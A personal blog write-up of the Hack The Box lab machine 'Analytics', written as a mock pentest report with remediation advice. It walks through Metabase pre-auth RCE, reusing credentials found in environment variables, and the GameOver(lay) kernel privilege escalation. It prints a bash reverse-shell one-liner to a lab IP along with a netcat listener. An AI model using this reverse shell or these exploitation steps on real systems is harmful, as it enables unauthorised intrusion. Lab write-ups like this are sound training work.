This is my first Hack the Box machine [pwned](https://www.hackthebox.com/achievement/machine/1695260/569) and itâ€™s called Analytics. Here is a mock write-up of the lab because as we all know. Itâ€™s great being able to pwn things but if we canâ€™t communicate the remediations to what we have done then there is no benifit past that juicy dopamine hit when you get root ðŸ˜€

#### Executive summary

The attacker achieved an initial foothold by abusing a pre-authentication remote code execution exploit to achieve a reverse shell. User credentials we then found in the environment variables and used to establish a user shell. This can be prevented by upgrading Metabase to the latest version and removing the environment variables with user account details if possible as a secondary objective.

Privilege was then escalated by using 2 kernel exploits from 2023 chained together. These can be remedied by upgrading our kernel version.  
The general recommendation is to update the software mentioned to later versions.

#### Technical Findings

Starting as per with a good old Nmap

Nothing of too much interest, letâ€™s take a closer look at the website.

For this will need to put <http://analytical.htb/> in my hosts file and run this puppy through Burp suite

There isnt much here but the login reroutes us to <http://data.analytical.htb/>. Adding that to our hosts file gets us this lovely Metabase login screen

![](https://i0.wp.com/i.imgur.com/OaJ9aIR.png?resize=504%2C552&ssl=1)

Lets dive into Metabase. There are default credentials available but those dont work. Looking for explicit exploits on the internet we find this [lovely git repo](https://github.com/Pyr0sec/CVE-2023-38646).

It allows for pre-auth remote code execution, this is exactly what we want. For this we need the setup token that can be found at the path `/api/session/properties`

Hitting this endpoint gets us a wonderful .json properties file. And within it we find the value of `setup-token` required for the execution of the exploit

Using this wonderful script combined with the token we can initialize a reverse shell using the following command, oh and also donâ€™t forget the listener on the other side:

`bash -i >& /dev/tcp/10.10.14.26/4444 0>&1<br></br>nc -nvlp 4444`

![](https://i0.wp.com/i.imgur.com/HrFdCZ7.png?resize=1136%2C160&ssl=1)

The server returns an error message but we got the juicy juicy shell

But sadly there is no flag in `/home/metabase` and mind you we are looking for both a user flag and a root flagâ€¦ So is this not the user we are meant to be???

After a little digging around on this box for longer than I care to admitâ€¦ I enumerated everything from cron jobs, running processes, kernel versions, installed apps, and much more looking for either user credentials or a route to escalate my privilage. I looked where I should have looked almost right away `env`

And there is the puppy. META\_USER and META\_PASS. Now could these be used to log in to the open SSH port on 22?

And it works! With our lovely user flag right there.

Now to get root. I came back to this bad boy while working in a coffee shop and used the pwnbox provided by Hack the Box as my attack box. Letâ€™s see what we can do.

There are several things I tried to look through. What binaries run within the admin context? Nopeâ€¦ Perhaps some cron jobs? Nope

Well what is the kernel and OS we are running on?

![](https://i0.wp.com/i.imgur.com/JLwNR2a.png?resize=799%2C70&ssl=1)

After a Google search for **linux 6.2.0-25-generic 22.04.2-ubuntu privilege escalation**, we found an interesting privilege escalation exploit called **GameOver(lay)** here is a link to a [POC on Github](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

The script is a massive one-liner so letâ€™s copy that bad boy onto our target machine and give it execute permissions

![](https://i0.wp.com/i.imgur.com/UlR3Ri3.png?resize=822%2C353&ssl=1)

This exploit makes use of two seperate vulnerabilities namely [**CVE-2023-2640**](https://www.cvedetails.com/cve/CVE-2023-2640/) and [**CVE-2023-32629**](https://www.cvedetails.com/cve/CVE-2023-32629/). Lets execute this bad boy!

![](https://i0.wp.com/i.imgur.com/emOZ2X4.png?resize=741%2C112&ssl=1)

ROOT BABY!!! and we find a beautiful flag right where we want her!

#### Conclusion

Both the exploitation of the Metabase and Kernel exploits can be solved with simply updating the respective software and operating system.

This was a fun lab and dont worry there are plenty more to come. Oh and if you have read this farâ€¦ Go touch some grass ðŸ˜€
